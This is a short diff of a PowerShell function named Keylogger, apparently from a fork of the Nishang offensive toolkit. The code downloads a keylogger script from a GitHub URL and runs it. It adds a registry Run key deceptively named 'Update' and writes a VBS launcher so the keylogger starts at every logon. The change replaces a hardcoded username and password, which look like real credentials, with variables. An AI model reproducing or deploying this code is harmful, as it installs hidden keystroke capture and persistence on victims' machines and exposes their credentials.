@@ -268,7 +268,7 @@ function script:Keylogger
 	$name = "persist.vbs" 
 
 	Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/nishang/master/Gather/Keylogger.ps1"))' -Force $env:TEMP\$modulename
-	Out-File -InputObject 'Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList "briana.joharah", "Bolshoibooze27"' -Append -NoClobber $env:TEMP\$modulename
+	Out-File -InputObject 'Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList "$username", "$password"' -Append -NoClobber $env:TEMP\$modulename
 
 	New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
 	echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
